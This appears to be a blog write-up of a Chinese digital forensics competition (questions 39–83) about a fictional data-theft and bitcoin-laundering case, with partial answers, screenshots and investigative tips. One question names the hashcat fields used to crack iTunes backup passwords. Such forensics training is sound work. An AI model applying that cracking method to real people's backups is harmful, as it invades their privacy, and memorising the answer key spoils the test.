<h1 id="39-通过-‘hashcat’-破解-‘iTunes-Backup’-密码需要制订一个-‘txt’-档案，若该备份的手机iOS版本是10以上，需要按照下列哪个提示字符-String-的数据去制订这个-‘txt’-档案-3"><a href="#39-通过-‘hashcat’-破解-‘iTunes-Backup’-密码需要制订一个-‘txt’-档案，若该备份的手机iOS版本是10以上，需要按照下列哪个提示字符-String-的数据去制订这个-‘txt’-档案-3" class="headerlink" title="39    通过 ‘hashcat’ 破解 ‘iTunes Backup’ 密码需要制订一个 ‘txt’ 档案，若该备份的手机iOS版本是10以上，需要按照下列哪个提示字符 (String) 的数据去制订这个 ‘txt’ 档案?    3"></a>39    通过 ‘hashcat’ 破解 ‘iTunes Backup’ 密码需要制订一个 ‘txt’ 档案，若该备份的手机iOS版本是10以上，需要按照下列哪个提示字符 (String) 的数据去制订这个 ‘txt’ 档案?    3</h1><p>多选<br>A:WPKY;<br>B:ITER;<br>C:SALT;<br>D:DPIC;<br>E:DPSL<br>A,B,C,D,E<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-184000758.png" class="">  </p>
<h1 id="40-王景浩采用了4位数字加密了他的iPhone-XR的备份，分析它的密码是什么-以阿拉伯数字回答-3-填空"><a href="#40-王景浩采用了4位数字加密了他的iPhone-XR的备份，分析它的密码是什么-以阿拉伯数字回答-3-填空" class="headerlink" title="40    王景浩采用了4位数字加密了他的iPhone XR的备份，分析它的密码是什么? (以阿拉伯数字回答)    3    填空"></a>40    王景浩采用了4位数字加密了他的iPhone XR的备份，分析它的密码是什么? (以阿拉伯数字回答)    3    填空</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-185737338.png" class="">  
<p>2022</p>
<h1 id="41-最后一次连上王景浩计算机的3D打印机的IP-地址是什么-不要输入答案中的-‘-’，以阿拉伯数字回答-2-填空"><a href="#41-最后一次连上王景浩计算机的3D打印机的IP-地址是什么-不要输入答案中的-‘-’，以阿拉伯数字回答-2-填空" class="headerlink" title="41    最后一次连上王景浩计算机的3D打印机的IP 地址是什么? (不要输入答案中的 ‘.’，以阿拉伯数字回答)    2    填空"></a>41    最后一次连上王景浩计算机的3D打印机的IP 地址是什么? (不要输入答案中的 ‘.’，以阿拉伯数字回答)    2    填空</h1><h1 id="42-3D打印机最后一次在王景浩的计算机尝试打印的时间-以时区UTC-8回答-2-填空"><a href="#42-3D打印机最后一次在王景浩的计算机尝试打印的时间-以时区UTC-8回答-2-填空" class="headerlink" title="42    3D打印机最后一次在王景浩的计算机尝试打印的时间? (以时区UTC+8回答)     2    填空"></a>42    3D打印机最后一次在王景浩的计算机尝试打印的时间? (以时区UTC+8回答)     2    填空</h1><pre><code>A:2022年10月20日下午4時30分;
</code></pre><p>  B:2022年10月20日下午18時30分;<br>  C:2022年10月21日下午4時30分;<br>  D:2022年10月21日下午8時30分    </p>
<h1 id="43-最后一次经由王景浩计算机打印的3D图档案名字是什么-2"><a href="#43-最后一次经由王景浩计算机打印的3D图档案名字是什么-2" class="headerlink" title="43    最后一次经由王景浩计算机打印的3D图档案名字是什么?    2"></a>43    最后一次经由王景浩计算机打印的3D图档案名字是什么?    2</h1><p>单选<br>A:CE3_balljoint_extender.gcode;<br>B:um3-penguin-real-mini-keychain-merged-tpu.gcode;<br>C:CE3_Prancer.gcode;<br>D:CE3_2020-psu-atx-mount.gcode    </p>
<h1 id="44-王景浩计算机的Safari浏览器的默认搜索引擎-Default-Search-Engine-是什么-2"><a href="#44-王景浩计算机的Safari浏览器的默认搜索引擎-Default-Search-Engine-是什么-2" class="headerlink" title="44    王景浩计算机的Safari浏览器的默认搜索引擎 (Default Search Engine) 是什么?    2"></a>44    王景浩计算机的Safari浏览器的默认搜索引擎 (Default Search Engine) 是什么?    2</h1><p>单选<br>A:百度;<br>B:谷歌;<br>C:360;<br>D:Safari    </p>
<img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-193126895.png" class="">  
<p>A</p>
<h1 id="45-分析王景浩计算机的数据，王景浩的比特币钱包-Bitcoin-Wallet-地址是什么-2"><a href="#45-分析王景浩计算机的数据，王景浩的比特币钱包-Bitcoin-Wallet-地址是什么-2" class="headerlink" title="45    分析王景浩计算机的数据，王景浩的比特币钱包 (Bitcoin Wallet) 地址是什么?    2"></a>45    分析王景浩计算机的数据，王景浩的比特币钱包 (Bitcoin Wallet) 地址是什么?    2</h1><p>单选<br>A:bc1quw… …zpzjzt;<br>B:bc1qm… …5f7n9g;<br>C:bc1q79… …h4sq52;<br>D:bc1qsl… …je7hkk    </p>
<h1 id="46-AGC公司员工-‘Carson’-有一个由公司发给他的电邮账户，分析王景浩的计算机数据并找出-‘Carson’-的电邮账户密码。-2"><a href="#46-AGC公司员工-‘Carson’-有一个由公司发给他的电邮账户，分析王景浩的计算机数据并找出-‘Carson’-的电邮账户密码。-2" class="headerlink" title="46    AGC公司员工 ‘Carson’ 有一个由公司发给他的电邮账户，分析王景浩的计算机数据并找出 ‘Carson’ 的电邮账户密码。    2"></a>46    AGC公司员工 ‘Carson’ 有一个由公司发给他的电邮账户，分析王景浩的计算机数据并找出 ‘Carson’ 的电邮账户密码。    2</h1><p>单选<br>A:AGC2020@pw;<br>B:AGC2012@PW;<br>C:AGC2020@hkg;<br>D:AGC2021@PW<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-191934181.png" class=""><br>C</p>
<h1 id="47-王景浩曾经冒充AGC公司员工-‘Carson’-发送电邮给AGC-客户，这封电邮的-‘Message-ID’-是什么-回答它的首８位数值。-以大写英文和阿拉伯数字回答，如-4GEF90GD-2-填空"><a href="#47-王景浩曾经冒充AGC公司员工-‘Carson’-发送电邮给AGC-客户，这封电邮的-‘Message-ID’-是什么-回答它的首８位数值。-以大写英文和阿拉伯数字回答，如-4GEF90GD-2-填空" class="headerlink" title="47    王景浩曾经冒充AGC公司员工 ‘Carson’ 发送电邮给AGC 客户，这封电邮的 ‘Message-ID’ 是什么? 回答它的首８位数值。(以大写英文和阿拉伯数字回答，如 4GEF90GD)    2    填空"></a>47    王景浩曾经冒充AGC公司员工 ‘Carson’ 发送电邮给AGC 客户，这封电邮的 ‘Message-ID’ 是什么? 回答它的首８位数值。(以大写英文和阿拉伯数字回答，如 4GEF90GD)    2    填空</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-191849857.png" class="">  
<h1 id="48-王景浩采用计算机里的哪种工具进入和盗取AGC公司的数据-2"><a href="#48-王景浩采用计算机里的哪种工具进入和盗取AGC公司的数据-2" class="headerlink" title="48    王景浩采用计算机里的哪种工具进入和盗取AGC公司的数据?    2"></a>48    王景浩采用计算机里的哪种工具进入和盗取AGC公司的数据?    2</h1><p>多选    A:Teamviewer;<br>B;OpenVPN;C;Remote Desktop Manager;<br>D:Tor Browser<br>ABC</p>
<h1 id="49-王景浩在AGC公司盗取了下列什么类型的档案-2"><a href="#49-王景浩在AGC公司盗取了下列什么类型的档案-2" class="headerlink" title="49    王景浩在AGC公司盗取了下列什么类型的档案?    2"></a>49    王景浩在AGC公司盗取了下列什么类型的档案?    2</h1><p>多选    A:ost;<br>B:xlsx;<br>C:jpg;<br>D:docx<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-191446885.png" class=""><br>AB</p>
<h1 id="50-王景浩的计算机于2022年9月29日曾经接上一个虚拟专用网络-Virtual-Private-Network-VPN-，这个VPN的IP地址是什么-不要输入答案中的-‘-’，以阿拉伯数字回答-2-填空"><a href="#50-王景浩的计算机于2022年9月29日曾经接上一个虚拟专用网络-Virtual-Private-Network-VPN-，这个VPN的IP地址是什么-不要输入答案中的-‘-’，以阿拉伯数字回答-2-填空" class="headerlink" title="50    王景浩的计算机于2022年9月29日曾经接上一个虚拟专用网络 (Virtual Private Network - VPN)，这个VPN的IP地址是什么? (不要输入答案中的 ‘.’，以阿拉伯数字回答)    2    填空"></a>50    王景浩的计算机于2022年9月29日曾经接上一个虚拟专用网络 (Virtual Private Network - VPN)，这个VPN的IP地址是什么? (不要输入答案中的 ‘.’，以阿拉伯数字回答)    2    填空</h1><p>邮箱里有,之后做题可以直接先把邮箱附件都给提出来一下<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-211454187.png" class="">  </p>
<h1 id="51-装置-‘「KingHoo」的iPhone’-的蓝牙媒体访问控制地址-MAC-Address-是什么-不要输入答案中的-‘：’-或-‘-‘-，以大写英文及阿拉伯数字回答-1-填空"><a href="#51-装置-‘「KingHoo」的iPhone’-的蓝牙媒体访问控制地址-MAC-Address-是什么-不要输入答案中的-‘：’-或-‘-‘-，以大写英文及阿拉伯数字回答-1-填空" class="headerlink" title="51    装置 ‘「KingHoo」的iPhone’ 的蓝牙媒体访问控制地址 (MAC Address) 是什么? (不要输入答案中的 ‘：’ 或 ‘-‘ ，以大写英文及阿拉伯数字回答)    1    填空"></a>51    装置 ‘「KingHoo」的iPhone’ 的蓝牙媒体访问控制地址 (MAC Address) 是什么? (不要输入答案中的 ‘：’ 或 ‘-‘ ，以大写英文及阿拉伯数字回答)    1    填空</h1><p>c81ee74af933</p>
<h1 id="52-王景浩何时将-‘小宝’-加为iPhone-XR的手机联络人-Contact-以时区UTC-8回答-1"><a href="#52-王景浩何时将-‘小宝’-加为iPhone-XR的手机联络人-Contact-以时区UTC-8回答-1" class="headerlink" title="52    王景浩何时将 ‘小宝’ 加为iPhone XR的手机联络人 (Contact) ? (以时区UTC +8回答)    1"></a>52    王景浩何时将 ‘小宝’ 加为iPhone XR的手机联络人 (Contact) ? (以时区UTC +8回答)    1</h1><p>单选<br>A:2022年07月14日;<br>B:2022年07月15日;<br>C:2022年07月16日;<br>D:2022年07月17日;<br>E:2022年07月18日;</p>
<img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-213543480.png" class="">  
<p>A</p>
<h1 id="53-王景浩的iPhone-XR显示他的汇丰银行户口于2022年9月19日收到多少存款-1"><a href="#53-王景浩的iPhone-XR显示他的汇丰银行户口于2022年9月19日收到多少存款-1" class="headerlink" title="53    王景浩的iPhone XR显示他的汇丰银行户口于2022年9月19日收到多少存款?    1"></a>53    王景浩的iPhone XR显示他的汇丰银行户口于2022年9月19日收到多少存款?    1</h1><p>单选<br>A:HKD298.8;<br>B:HKD344.7;<br>C:HKD396;<br>D:HKD543;<br>E:HKD465.1</p>
<img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-213643555.png" class="">  
<p>B</p>
<h1 id="54-王景浩的iPhone-XR没有收藏-Bookmark-哪家音响品牌的网页-1"><a href="#54-王景浩的iPhone-XR没有收藏-Bookmark-哪家音响品牌的网页-1" class="headerlink" title="54    王景浩的iPhone XR没有收藏 (Bookmark) 哪家音响品牌的网页?    1"></a>54    王景浩的iPhone XR没有收藏 (Bookmark) 哪家音响品牌的网页?    1</h1><p>单选<br>A:KEF;<br>B:EDIFIER;<br>C:BOSE;<br>D:YAMAHA;<br>E:Bowers &amp; Wilkins    </p>
<h1 id="55-王景浩的iPhone-XR手机记录了他曾于2022年8月26日试飞无人机，-当天试飞的地点在哪里-2"><a href="#55-王景浩的iPhone-XR手机记录了他曾于2022年8月26日试飞无人机，-当天试飞的地点在哪里-2" class="headerlink" title="55    王景浩的iPhone XR手机记录了他曾于2022年8月26日试飞无人机， 当天试飞的地点在哪里?    2"></a>55    王景浩的iPhone XR手机记录了他曾于2022年8月26日试飞无人机， 当天试飞的地点在哪里?    2</h1><p>单选<br>A:大埔海滨;<br>B:启德;<br>C:数码港;<br>D:西环;<br>E:将军澳<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-220858510.png" class=""><br>像这种手机套无人机的基本都是大疆,所以直接再应用列表里搜Dji或者fly应该可以搜到,无人机的app<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-220948941.png" class="">  </p>
<img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-222717954.png" class="">  
<p>在通过直接在文件里搜索dji可以找到一些大疆的db文件。这样就可以找到djiapp数据存储的文件夹，将其导出丢到物联网取证中<br>定位其他app的目录应该也可以用这种思路</p>
<h1 id="56-王景浩于2022年8月26日试飞无人机的总飞行时间-Total-Flight-Time-多久-2"><a href="#56-王景浩于2022年8月26日试飞无人机的总飞行时间-Total-Flight-Time-多久-2" class="headerlink" title="56    王景浩于2022年8月26日试飞无人机的总飞行时间 (Total Flight Time) 多久?    2"></a>56    王景浩于2022年8月26日试飞无人机的总飞行时间 (Total Flight Time) 多久?    2</h1><p>单选<br>A:6分58秒;<br>B:8分10秒;<br>C:9分6秒;<br>D:11分1秒;<br>E:15分33秒    </p>
<h1 id="57-王景浩用-iPhone-XR-拍了一张照片’IMG-0012-HEIC’，那照片什么地方曾被修改-3"><a href="#57-王景浩用-iPhone-XR-拍了一张照片’IMG-0012-HEIC’，那照片什么地方曾被修改-3" class="headerlink" title="57    王景浩用 iPhone XR 拍了一张照片’IMG_0012.HEIC’，那照片什么地方曾被修改?    3"></a>57    王景浩用 iPhone XR 拍了一张照片’IMG_0012.HEIC’，那照片什么地方曾被修改?    3</h1><p>多选    A:拍摄时间;<br>B:经纬度;<br>C:时区;<br>D:档案名称;<br>E:拍摄装备    </p>
<h1 id="58-承上题，那张照片修改后的经纬度是什么-不要输入答案中的-‘-’，将经纬度合并回答。-如-22-2846135-114-1739116，需回答-2228461351141739116-3-填空"><a href="#58-承上题，那张照片修改后的经纬度是什么-不要输入答案中的-‘-’，将经纬度合并回答。-如-22-2846135-114-1739116，需回答-2228461351141739116-3-填空" class="headerlink" title="58    承上题，那张照片修改后的经纬度是什么? (不要输入答案中的 ‘.’，将经纬度合并回答。 如 22.2846135 114.1739116，需回答 2228461351141739116)    3    填空"></a>58    承上题，那张照片修改后的经纬度是什么? (不要输入答案中的 ‘.’，将经纬度合并回答。 如 22.2846135 114.1739116，需回答 2228461351141739116)    3    填空</h1><h1 id="59-朗尼草莓-Raspberry-计算机操作系统的主机名称-hostname-是什么-1"><a href="#59-朗尼草莓-Raspberry-计算机操作系统的主机名称-hostname-是什么-1" class="headerlink" title="59    朗尼草莓 (Raspberry) 计算机操作系统的主机名称 (hostname) 是什么?    1"></a>59    朗尼草莓 (Raspberry) 计算机操作系统的主机名称 (hostname) 是什么?    1</h1><p>单选<br>A:OpenWrt;<br>B:admin;<br>C:root;<br>D:AsusRt;<br>E:DDwrt    </p>
<h1 id="60-以下哪项对于朗尼草莓计算机操作系统的描述是正确的-2"><a href="#60-以下哪项对于朗尼草莓计算机操作系统的描述是正确的-2" class="headerlink" title="60    以下哪项对于朗尼草莓计算机操作系统的描述是正确的?    2"></a>60    以下哪项对于朗尼草莓计算机操作系统的描述是正确的?    2</h1><p>多选    A:LAN地址是 192.168.1.24;<br>B:提供点对点隧道协议 (Point-to-Point Tunneling Protocol - PPTP) VPN服务;<br>C:WIFI登录密码为’OpenWrt’;<br>D:提供网络时间协议 (NTP) 服务;<br>E:时区设置相等于UTC+8    </p>
<h1 id="61-承上题，’VPN’-服务器的IP地址及端口-Port-是什么-2"><a href="#61-承上题，’VPN’-服务器的IP地址及端口-Port-是什么-2" class="headerlink" title="61    承上题，’VPN’ 服务器的IP地址及端口 (Port) 是什么?    2"></a>61    承上题，’VPN’ 服务器的IP地址及端口 (Port) 是什么?    2</h1><p>多选    A:IP地址 61.238.217.108;<br>B:IP地址 192.168.8.1;<br>C:IP地址 103.10.12.106;<br>D:端口 33248;<br>E:端口 1194;F:端口 1701    </p>
<h1 id="62-朗尼草莓计算机操作系统设定了一个档案来储存系统的-‘elog-fil’-，档案名称是什么-不要输入-‘-’，以大写英文及阿拉伯数字回答。如-Cat10-jpg，需回答CAT10JPG-2-填空"><a href="#62-朗尼草莓计算机操作系统设定了一个档案来储存系统的-‘elog-fil’-，档案名称是什么-不要输入-‘-’，以大写英文及阿拉伯数字回答。如-Cat10-jpg，需回答CAT10JPG-2-填空" class="headerlink" title="62    朗尼草莓计算机操作系统设定了一个档案来储存系统的 ‘elog_fil’ ，档案名称是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG)    2    填空"></a>62    朗尼草莓计算机操作系统设定了一个档案来储存系统的 ‘elog_fil’ ，档案名称是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG)    2    填空</h1><h1 id="63-承上题，检视上述的档案，当中有几个IP地址曾经成功登录这个系统的-‘VPN’-服务-3"><a href="#63-承上题，检视上述的档案，当中有几个IP地址曾经成功登录这个系统的-‘VPN’-服务-3" class="headerlink" title="63    承上题，检视上述的档案，当中有几个IP地址曾经成功登录这个系统的 ‘VPN’ 服务?    3"></a>63    承上题，检视上述的档案，当中有几个IP地址曾经成功登录这个系统的 ‘VPN’ 服务?    3</h1><p>单选<br>A:1;<br>B:2;<br>C:3;<br>D:4;<br>E:0    </p>
<h1 id="64-承上题，检视上述的档案，当中有几个IP地址曾经尝试以-‘root’-登入装置但因密码错误而不成功-2"><a href="#64-承上题，检视上述的档案，当中有几个IP地址曾经尝试以-‘root’-登入装置但因密码错误而不成功-2" class="headerlink" title="64    承上题，检视上述的档案，当中有几个IP地址曾经尝试以 ‘root’ 登入装置但因密码错误而不成功?    2"></a>64    承上题，检视上述的档案，当中有几个IP地址曾经尝试以 ‘root’ 登入装置但因密码错误而不成功?    2</h1><p>单选<br>A:2;<br>B:4;<br>C:5;<br>D:6;<br>E:8    </p>
<h1 id="65-根据装置的过往记录，’log-file’-是设在-‘usr-rooney-‘-的哪个已被删除的子文件夹里-Sub-Directory-以大写英文回答-3-填空"><a href="#65-根据装置的过往记录，’log-file’-是设在-‘usr-rooney-‘-的哪个已被删除的子文件夹里-Sub-Directory-以大写英文回答-3-填空" class="headerlink" title="65    根据装置的过往记录，’log_file’ 是设在 ‘usr/rooney/‘ 的哪个已被删除的子文件夹里 (Sub Directory)? (以大写英文回答)    3    填空"></a>65    根据装置的过往记录，’log_file’ 是设在 ‘usr/rooney/‘ 的哪个已被删除的子文件夹里 (Sub Directory)? (以大写英文回答)    3    填空</h1><h1 id="66-王景浩-SD-记忆卡-SD-Memory-Card-的储存容量有多少个字节-Byte-以阿拉伯数字回答-1-填空"><a href="#66-王景浩-SD-记忆卡-SD-Memory-Card-的储存容量有多少个字节-Byte-以阿拉伯数字回答-1-填空" class="headerlink" title="66    王景浩 SD 记忆卡 (SD Memory Card) 的储存容量有多少个字节 (Byte) ? (以阿拉伯数字回答)    1    填空"></a>66    王景浩 SD 记忆卡 (SD Memory Card) 的储存容量有多少个字节 (Byte) ? (以阿拉伯数字回答)    1    填空</h1><h1 id="67-检视记忆卡上硬盘分区表-Partition-Table-资讯，记忆卡共有多少个分区-Partition-1"><a href="#67-检视记忆卡上硬盘分区表-Partition-Table-资讯，记忆卡共有多少个分区-Partition-1" class="headerlink" title="67    检视记忆卡上硬盘分区表 (Partition Table) 资讯，记忆卡共有多少个分区 (Partition) ?    1"></a>67    检视记忆卡上硬盘分区表 (Partition Table) 资讯，记忆卡共有多少个分区 (Partition) ?    1</h1><p>单选<br>A:1;<br>B:2;<br>C:3;<br>D:4;<br>E:0    </p>
<h1 id="68-检视记忆卡上硬盘分区表资讯，第二个分区的分区代码-Partition-Code-是什么-1"><a href="#68-检视记忆卡上硬盘分区表资讯，第二个分区的分区代码-Partition-Code-是什么-1" class="headerlink" title="68    检视记忆卡上硬盘分区表资讯，第二个分区的分区代码 (Partition Code) 是什么?    1"></a>68    检视记忆卡上硬盘分区表资讯，第二个分区的分区代码 (Partition Code) 是什么?    1</h1><p>单选<br>A:07;<br>B:AF;<br>C:0C;<br>D:2B;<br>E:01    </p>
<h1 id="69-记忆卡的档案不能被读取，记忆卡受损的原因包括-2"><a href="#69-记忆卡的档案不能被读取，记忆卡受损的原因包括-2" class="headerlink" title="69    记忆卡的档案不能被读取，记忆卡受损的原因包括?    2"></a>69    记忆卡的档案不能被读取，记忆卡受损的原因包括?    2</h1><p>多选    A:目录项结构 (Directory Entry) 受损;<br>B:启动扇区表 (Master Boot Record) 受损;<br>C:文件分配表 (File Allocation Table - FAT) 受损;<br>D:引导扇区 (Boot Sector) 受损;<br>E:以上各项皆是    </p>
<h1 id="70-承上题，通过分析及手动恢复还原，记忆卡里有多少个出錯的情况出现-以阿拉伯数字回答-3-填空"><a href="#70-承上题，通过分析及手动恢复还原，记忆卡里有多少个出錯的情况出现-以阿拉伯数字回答-3-填空" class="headerlink" title="70    承上题，通过分析及手动恢复还原，记忆卡里有多少个出錯的情况出现? (以阿拉伯数字回答)    3    填空"></a>70    承上题，通过分析及手动恢复还原，记忆卡里有多少个出錯的情况出现? (以阿拉伯数字回答)    3    填空</h1><h1 id="71-记忆卡第一个文件系统-File-System-中有一个图片档案，它的SHA-256哈希值是-‘F7E003781456D2E01CFE0EB46988D5BB433ADF9841164BBB90BAC67C0C9B21AF’。该档案显示了哪些影像-2"><a href="#71-记忆卡第一个文件系统-File-System-中有一个图片档案，它的SHA-256哈希值是-‘F7E003781456D2E01CFE0EB46988D5BB433ADF9841164BBB90BAC67C0C9B21AF’。该档案显示了哪些影像-2" class="headerlink" title="71    记忆卡第一个文件系统 (File System) 中有一个图片档案，它的SHA-256哈希值是  ‘F7E003781456D2E01CFE0EB46988D5BB433ADF9841164BBB90BAC67C0C9B21AF’。该档案显示了哪些影像?    2"></a>71    记忆卡第一个文件系统 (File System) 中有一个图片档案，它的SHA-256哈希值是  ‘F7E003781456D2E01CFE0EB46988D5BB433ADF9841164BBB90BAC67C0C9B21AF’。该档案显示了哪些影像?    2</h1><p>多选    A:人;<br>B:山;<br>C:汽车;<br>D:交通灯;<br>E:天空    </p>
<h1 id="72-检视记忆卡的数据，在2022年10月9日约中午12时5分至12时15分之间的录像-Video-中，曾经出现哪一个IP地址-2"><a href="#72-检视记忆卡的数据，在2022年10月9日约中午12时5分至12时15分之间的录像-Video-中，曾经出现哪一个IP地址-2" class="headerlink" title="72    检视记忆卡的数据，在2022年10月9日约中午12时5分至12时15分之间的录像 (Video) 中，曾经出现哪一个IP地址?    2"></a>72    检视记忆卡的数据，在2022年10月9日约中午12时5分至12时15分之间的录像 (Video) 中，曾经出现哪一个IP地址?    2</h1><p>单选<br>A:61.238.217.108;<br>B:155.137.190.123;<br>C:192.168.1.66;<br>D:185.200.100.242;<br>E:213.104.156.111    </p>
<h1 id="73-恢复还原后的记忆卡中，第二个文件系统显示有多少个空闲簇-Free-Cluster-以阿拉伯数字回答-2-填空"><a href="#73-恢复还原后的记忆卡中，第二个文件系统显示有多少个空闲簇-Free-Cluster-以阿拉伯数字回答-2-填空" class="headerlink" title="73    恢复还原后的记忆卡中，第二个文件系统显示有多少个空闲簇 (Free Cluster)? (以阿拉伯数字回答)    2    填空"></a>73    恢复还原后的记忆卡中，第二个文件系统显示有多少个空闲簇 (Free Cluster)? (以阿拉伯数字回答)    2    填空</h1><h1 id="74-记忆卡第一个文件系统中有一个视频档，它的SHA-256哈希值是-‘847E1E5FEF64B49C8D689DC3537D619B87666619A7C1EF0CC821153641847C19’，这个视频的档数据存在文件系统-File-System-的最后的簇号-Last-Cluster-Number-是什么-以阿拉伯数字回答-2-填空"><a href="#74-记忆卡第一个文件系统中有一个视频档，它的SHA-256哈希值是-‘847E1E5FEF64B49C8D689DC3537D619B87666619A7C1EF0CC821153641847C19’，这个视频的档数据存在文件系统-File-System-的最后的簇号-Last-Cluster-Number-是什么-以阿拉伯数字回答-2-填空" class="headerlink" title="74    记忆卡第一个文件系统中有一个视频档，它的SHA-256哈希值是 ‘847E1E5FEF64B49C8D689DC3537D619B87666619A7C1EF0CC821153641847C19’，这个视频的档数据存在文件系统 (File System) 的最后的簇号 (Last Cluster Number) 是什么? (以阿拉伯数字回答)    2    填空"></a>74    记忆卡第一个文件系统中有一个视频档，它的SHA-256哈希值是 ‘847E1E5FEF64B49C8D689DC3537D619B87666619A7C1EF0CC821153641847C19’，这个视频的档数据存在文件系统 (File System) 的最后的簇号 (Last Cluster Number) 是什么? (以阿拉伯数字回答)    2    填空</h1><h1 id="75-尝试分析记忆卡数据結構受损的原因，通过合适的方法把数据恢复到原本没有出错的状况，记忆卡的SHA-256哈希值是什么？-3"><a href="#75-尝试分析记忆卡数据結構受损的原因，通过合适的方法把数据恢复到原本没有出错的状况，记忆卡的SHA-256哈希值是什么？-3" class="headerlink" title="75    尝试分析记忆卡数据結構受损的原因，通过合适的方法把数据恢复到原本没有出错的状况，记忆卡的SHA-256哈希值是什么？    3"></a>75    尝试分析记忆卡数据結構受损的原因，通过合适的方法把数据恢复到原本没有出错的状况，记忆卡的SHA-256哈希值是什么？    3</h1><p>单选<br>A:E63DF0… …8627D3;<br>B:3FD99E… …17B6DE;<br>C:3BADAA… …666A8F;<br>D:BBB211… …E00710;<br>E:AA9E81… …2C04FE    </p>
<h1 id="76-朗尼的计算机有什么软件可以创建比特币钱包-Bitcoin-Wallet-1"><a href="#76-朗尼的计算机有什么软件可以创建比特币钱包-Bitcoin-Wallet-1" class="headerlink" title="76    朗尼的计算机有什么软件可以创建比特币钱包 (Bitcoin Wallet)?    1"></a>76    朗尼的计算机有什么软件可以创建比特币钱包 (Bitcoin Wallet)?    1</h1><p>单选<br>A:MetaMask;<br>B:Electrum;<br>C:Trezor;<br>D:以上皆非    </p>
<h1 id="77-朗尼通过比特币替王景浩清洗黑钱，分析朗尼的计算机及手机，朗尼收取王景浩黑钱的比特币地址-Bitcoin-Address-是什么-以大写英文及阿拉伯数字回答-1-填空"><a href="#77-朗尼通过比特币替王景浩清洗黑钱，分析朗尼的计算机及手机，朗尼收取王景浩黑钱的比特币地址-Bitcoin-Address-是什么-以大写英文及阿拉伯数字回答-1-填空" class="headerlink" title="77    朗尼通过比特币替王景浩清洗黑钱，分析朗尼的计算机及手机，朗尼收取王景浩黑钱的比特币地址 (Bitcoin Address) 是什么? (以大写英文及阿拉伯数字回答)    1    填空"></a>77    朗尼通过比特币替王景浩清洗黑钱，分析朗尼的计算机及手机，朗尼收取王景浩黑钱的比特币地址 (Bitcoin Address) 是什么? (以大写英文及阿拉伯数字回答)    1    填空</h1><h1 id="78-朗尼收取王景浩多少比特币作为清洗黑钱的费用-1"><a href="#78-朗尼收取王景浩多少比特币作为清洗黑钱的费用-1" class="headerlink" title="78    朗尼收取王景浩多少比特币作为清洗黑钱的费用?    1"></a>78    朗尼收取王景浩多少比特币作为清洗黑钱的费用?    1</h1><p>单选<br>A:1%;<br>B:4%;<br>C:7%;<br>D:10%;<br>E:15%    </p>
<h1 id="79-朗尼的计算机里有一个没被加密的比特币钱包，它的回复种子-Recovery-Seed-不包含哪一个英文字-1"><a href="#79-朗尼的计算机里有一个没被加密的比特币钱包，它的回复种子-Recovery-Seed-不包含哪一个英文字-1" class="headerlink" title="79    朗尼的计算机里有一个没被加密的比特币钱包，它的回复种子 (Recovery Seed) 不包含哪一个英文字?    1"></a>79    朗尼的计算机里有一个没被加密的比特币钱包，它的回复种子 (Recovery Seed) 不包含哪一个英文字?    1</h1><p>单选<br>A:oppose;<br>B:area;<br>C:twice;<br>D:roast    </p>
<h1 id="80-朗尼的计算机里有多少个加密了-Encrypted-的比特币钱包-1"><a href="#80-朗尼的计算机里有多少个加密了-Encrypted-的比特币钱包-1" class="headerlink" title="80    朗尼的计算机里有多少个加密了 (Encrypted) 的比特币钱包?    1"></a>80    朗尼的计算机里有多少个加密了 (Encrypted) 的比特币钱包?    1</h1><p>单选<br>A:1;<br>B:2;<br>C:3;<br>D:4;<br>E:5    </p>
<h1 id="81-朗尼将加密了的比特币钱包的密码存在他计算机的一个档案里，这个档案的副档名是什么-以大写英文及阿拉伯数字回答-3"><a href="#81-朗尼将加密了的比特币钱包的密码存在他计算机的一个档案里，这个档案的副档名是什么-以大写英文及阿拉伯数字回答-3" class="headerlink" title="81    朗尼将加密了的比特币钱包的密码存在他计算机的一个档案里，这个档案的副档名是什么? (以大写英文及阿拉伯数字回答)    3"></a>81    朗尼将加密了的比特币钱包的密码存在他计算机的一个档案里，这个档案的副档名是什么? (以大写英文及阿拉伯数字回答)    3</h1><p>单选<br>A:DMG;<br>B:PDF;<br>C:ASD;<br>D:ZIP;<br>E:PNG    </p>
<h1 id="82-朗尼在手机里有一个加密了的比特币钱包，他采用什么应用程序把该钱包里的黑钱转换成另一种加密货币-2"><a href="#82-朗尼在手机里有一个加密了的比特币钱包，他采用什么应用程序把该钱包里的黑钱转换成另一种加密货币-2" class="headerlink" title="82    朗尼在手机里有一个加密了的比特币钱包，他采用什么应用程序把该钱包里的黑钱转换成另一种加密货币?    2"></a>82    朗尼在手机里有一个加密了的比特币钱包，他采用什么应用程序把该钱包里的黑钱转换成另一种加密货币?    2</h1><p>单选<br>A:Safepal;<br>B:Metamask;<br>C:Changelly;<br>D:Opensea    </p>
<h1 id="83-承上题，这次转换加密货币的日期和时间是什么-以时区UTC-8回答-2"><a href="#83-承上题，这次转换加密货币的日期和时间是什么-以时区UTC-8回答-2" class="headerlink" title="83    承上题，这次转换加密货币的日期和时间是什么? (以时区UTC+8回答)    2"></a>83    承上题，这次转换加密货币的日期和时间是什么? (以时区UTC+8回答)    2</h1><p>单选<br>A:2022-10-07 10:29时;<br>B:2022-10-07 11:06时;<br>C:2022-10-07 11:07时;<br>D:2022-10-07 13:54时    </p>
